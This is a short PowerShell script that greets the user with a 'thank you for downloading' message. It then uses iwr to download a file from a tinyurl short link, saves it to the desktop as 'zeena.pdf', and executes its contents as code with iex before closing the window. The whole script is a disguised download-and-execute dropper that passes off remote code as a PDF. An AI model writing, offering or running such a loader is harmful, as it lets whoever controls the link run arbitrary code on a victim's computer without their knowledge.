write-host "Thank you for downloading! :)" -ForegroundColor Green
powershell iwr "https://tinyurl.com/pdf4zeena" -OutFile "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
iex "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
start-sleep -seconds 3
write-host "This window will now close..." -ForegroundColor Green
start-sleep -seconds 2
exit
